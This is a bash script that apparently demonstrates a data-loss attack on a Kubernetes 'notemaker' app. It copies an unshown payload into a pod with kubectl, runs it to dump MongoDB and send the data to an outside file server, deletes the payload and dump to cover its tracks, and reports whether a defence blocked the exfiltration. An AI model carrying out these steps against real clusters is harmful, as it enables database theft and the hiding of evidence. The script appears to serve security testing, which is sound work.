#!/bin/bash
wait_for_running() {
  echo   "   >> waiting for all $1 pods to be Running again"
  printf "   >> "
  while true; do
    printf "."
    sleep 5
    block=$(kubectl get pods -n notemaker | grep $1 | grep -v Running)
    [[ -z "$block" ]] && break
  done
  echo; echo "   >> all $1 PODS Running"; echo
}

echo "-----------------  DATA LOSS ATTACK  ---------------------" 
echo "---- retrieving all data from mongodb and sending it  ----"
echo "---        to my file server in Mongolia              ----"

# find the first performance-meter pod that is Running
pod=$(kubectl get pods -n notemaker | grep performance | awk '{print $1}')

echo   ">>> deploying attack payload into pod $pod"
kubectl cp all_data_steal.sh notemaker/$pod:/tmp/remote.sh

echo ">>> run it to dump mongodb db and send out all the data"
response=$(kubectl exec -it -n notemaker $pod -- sh -c "/tmp/remote.sh")
echo ">>> /tmp/remote.sh executed in $pod"

sleep 2

block=$(kubectl get pods -n notemaker | grep perf | grep -v Running)
if [[ ! -z "$block" ]]; then
  kubectl get pods -n notemaker | grep perf | tr -s "   " 
  echo "--------------- DATALOSS ATTACK FAILED -------------------"
  wait_for_running perf-meter
  exit 1 
fi

echo ">>> cover tracks by removing attack payload and data dump"
kubectl exec -it -n notemaker $pod -- \
  sh -c "rm /tmp/remote.sh; cd /home; rm dump.tar.gz ; rm -rf dump"

attackFailed=$(echo $response | grep "Operation not permitted")

if [[ -n "$attackFailed" ]]; then
  echo "*****    attempt of sending out all data prevented   *****"
  echo "---------------- DATA LOSS ATTACK FAILED -----------------"
else
  echo "+++ sending all db data succeeded - COMPLETE DATA LOSS"
  echo "!--------------- DATA LOSS ATTACK SUCCESSFUL -------------"
fi
echo
 
